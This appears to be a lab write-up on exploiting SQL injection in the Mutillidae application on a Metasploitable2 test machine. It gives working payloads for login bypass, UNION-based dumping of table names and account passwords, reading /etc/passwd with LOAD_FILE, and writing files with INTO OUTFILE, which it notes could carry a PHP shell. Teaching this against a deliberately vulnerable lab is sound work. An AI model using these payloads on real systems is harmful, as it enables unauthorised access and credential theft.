# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![244885508-4c83fc80-0108-44d7-92b8-b6292ec99686](https://github.com/user-attachments/assets/173fd859-fa13-4458-8aa9-48c74299f477)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![244886609-81aa3c6a-fd5d-4b8f-8656-b921cd05e1f4](https://github.com/user-attachments/assets/541a8837-4a77-4afd-8056-ea6aad3e0d9a)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![244885516-65d72597-0297-485a-8c57-d335bf885ba6](https://github.com/user-attachments/assets/a93e345d-b517-49c4-a7b4-3107cc2391dd)

Click on the menu Login/Register and register for an account

![244885618-dfe4513c-3c0d-43e0-b1e4-ad4baee43b98](https://github.com/user-attachments/assets/5051c0e7-e2de-4dcd-8c64-5eab95cdd716)

Click on the link “Please register here”

![440108062-d5060228-24da-4fcc-bddb-9dd463668413](https://github.com/user-attachments/assets/bfcaa5ac-7a5a-45e4-9fa1-79ce775afcb7)

Click on “Create Account” to display the following page:

![244885637-499aca4d-391b-4f0e-ac33-31ace3337955](https://github.com/user-attachments/assets/7a3bbb1a-6594-440c-9adb-5ed5a34acc66)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![440108105-9477de51-a1a1-4345-b425-e32cb175726b](https://github.com/user-attachments/assets/0f5023f6-9625-4ef2-b08b-6e25566895ab)

Click “Login”. The logged in page will show as below:

![244885649-037084b7-47fb-40ac-85cc-43f91dde84b5](https://github.com/user-attachments/assets/3fea08a1-8bdb-42af-bb87-5cade2a53d08)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![440108148-23d4d049-960e-4b14-911f-4fc6caea8514](https://github.com/user-attachments/assets/401636a1-bc72-4c22-9747-db264efb639c)

Click the login button and you will see it enter into the administrator page.

![244885664-ac33b189-494b-4a5f-bce2-b840ab35e5fc](https://github.com/user-attachments/assets/267aa768-a19a-4548-b0ce-ce3624ae51eb)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![244885834-a242176f-df4f-4eb2-8296-0671fd7d7264](https://github.com/user-attachments/assets/0d8a4ab3-d792-4d77-b7f5-070562581e5d)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![244885838-10c8f015-3770-46b5-b320-bf37cc7bbdae](https://github.com/user-attachments/assets/bc1a5e99-6565-4e50-9e53-87e3e8d29c36)

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![244885847-0eb340b9-63a6-433e-878b-45f3b396f1a2](https://github.com/user-attachments/assets/5b569bf1-455d-4175-93a2-685959143e7a)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![244885847-0eb340b9-63a6-433e-878b-45f3b396f1a2](https://github.com/user-attachments/assets/ced2d9fc-ac8b-4cc5-b457-cf84028430f7)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![244885848-86073e2f-937b-47a4-9b9d-c0c2863b2a7c](https://github.com/user-attachments/assets/7d524ddc-bbda-437a-a8c2-109b095a1355)

As it is having 5 columns the query worked fine and it provides the correct result

![244885850-7a660480-5cb6-4d86-acd1-08f7a4d5e2fa](https://github.com/user-attachments/assets/54dec713-c6be-4915-9ca3-9815bdb3b41e)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![244885874-1c7ac260-3410-4f75-8091-2cda6b7f20c0](https://github.com/user-attachments/assets/63a4ed22-bdbd-4e30-8ecf-b3cbcf9f70cf)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![244885894-12ebac90-8efb-4558-a442-541029220fa3](https://github.com/user-attachments/assets/b6404608-a273-4801-b458-d2fe1e7ec990)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![244885896-78ba6fc7-7ab6-4c39-8a7f-c8e4240775b8](https://github.com/user-attachments/assets/ed789352-33ef-4eff-a090-2a001dd022ee)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![244885899-68ccd33b-a98d-4ff6-8c19-57e63c2724d0](https://github.com/user-attachments/assets/ad50ffdf-2020-44c0-96a0-124ca00484c7)


The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![244885902-c820f87a-30cb-485b-b423-f6fd0e67c96e](https://github.com/user-attachments/assets/74b6e9df-1e69-4d95-90e1-1694db7f5fbe)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![244885902-c820f87a-30cb-485b-b423-f6fd0e67c96e](https://github.com/user-attachments/assets/a0581171-e4e5-46ee-84ea-1a1d6410733e)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![244885903-f7dd79fb-c11c-41f3-8019-06685e9cd759](https://github.com/user-attachments/assets/f3fc6630-f371-45cc-a7f8-8cb78a436155)

## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![244885909-13f4a113-06fc-4d62-a8ec-6525c4ec1343](https://github.com/user-attachments/assets/84c15fba-e4fe-413c-a282-ba6c3ec00655)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
